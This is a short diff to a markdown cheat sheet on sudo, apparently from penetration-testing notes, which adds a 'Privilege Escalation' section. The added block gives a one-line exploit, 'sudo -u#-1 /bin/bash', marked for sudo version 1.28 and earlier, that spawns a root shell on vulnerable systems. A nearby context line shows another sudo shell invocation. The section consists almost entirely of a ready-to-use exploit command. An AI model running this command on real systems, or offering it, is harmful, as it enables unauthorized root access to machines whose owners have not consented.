@@ -20,6 +20,15 @@ sudo -h host-name /bin/bash
 
 <br />
 
+## Privilege Escalation
+
+```sh
+# version <= 1.28
+sudo -u#-1 /bin/bash
+```
+
+<br />
+
 ## Misc
 
 ```sh
